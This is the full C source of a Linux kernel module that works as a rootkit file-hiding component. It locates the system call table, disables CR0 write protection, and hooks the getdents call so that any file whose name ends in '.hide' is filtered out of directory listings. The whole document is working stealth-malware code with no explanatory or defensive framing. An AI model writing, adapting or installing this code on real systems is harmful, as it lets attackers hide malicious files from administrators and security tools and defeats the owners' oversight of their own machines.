#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");

#define HIDE_EXT ".hide"
#define EXT_LEN (sizeof(HIDE_EXT) - 1)
#define DIRENT_PART_SIZE (2* sizeof(unsigned long) + sizeof(unsigned short)) // size of the first 3 linux_dirent fields

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

unsigned long *sys_call_table = NULL;
asmlinkage long (*original_getdents)(const struct pt_regs *regs);

inline void disable_write_protect(void) {
    write_cr0(read_cr0() & (~0x10000));
}

inline void enable_write_protect(void) {
    write_cr0(read_cr0() | 0x10000);
}

asmlinkage long getdents_hook(const struct pt_regs *regs) {
    struct linux_dirent *dirp, *filtered_dirp, *last_filtered, *temp_dirp;
    size_t name_len;
    unsigned long copy_res;
    int orig_bytes_read, res_bytes_read, remaining_bytes;

    orig_bytes_read = original_getdents(regs);
    if (orig_bytes_read <= 0) {
        return orig_bytes_read;
    }

    dirp = (struct linux_dirent *) regs->si;
    filtered_dirp = (struct linux_dirent *) kmalloc(orig_bytes_read, GFP_KERNEL);
    copy_res = copy_from_user(filtered_dirp, dirp, orig_bytes_read);
    if (copy_res != 0) {
        printk(KERN_ALERT "Can't copy from user space");
        kfree(filtered_dirp);
        return orig_bytes_read;
    }

    last_filtered = filtered_dirp;           // Points to the last element of filtered part
    temp_dirp = filtered_dirp;               // Used as iterator to go through all dirp elements
    remaining_bytes = orig_bytes_read;
    res_bytes_read = orig_bytes_read;
    while (remaining_bytes > 0) {
        if (temp_dirp->d_reclen <= 0) {
            printk(KERN_ALERT "linux_dirent struct bad size: %hu", temp_dirp->d_reclen);
            break;
        }

        name_len = strnlen(temp_dirp->d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);
        if (strcmp(HIDE_EXT, temp_dirp->d_name + name_len - EXT_LEN) == 0) {
            res_bytes_read -= temp_dirp->d_reclen;
        } else {
            if (last_filtered != temp_dirp) {
                memcpy(last_filtered, temp_dirp, temp_dirp->d_reclen);
            }
            last_filtered = (struct linux_dirent *) ((char *) last_filtered + last_filtered->d_reclen);
        }
        remaining_bytes -= temp_dirp->d_reclen;
        temp_dirp = (struct linux_dirent *) ((char *) temp_dirp + temp_dirp->d_reclen);
    }

    copy_res = copy_to_user(dirp, filtered_dirp, res_bytes_read);
    if (copy_res != 0) {
        printk(KERN_ALERT "Can't copy to user space");
        res_bytes_read = orig_bytes_read;
    }

    kfree(filtered_dirp);
    return res_bytes_read;
}

static int __init hide_files_init(void) {
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    original_getdents = (void *) sys_call_table[__NR_getdents];
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
    enable_write_protect();
    return 0;
}

static void __exit hide_files_exit(void) {
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
    enable_write_protect();
}

module_init(hide_files_init);
module_exit(hide_files_exit);
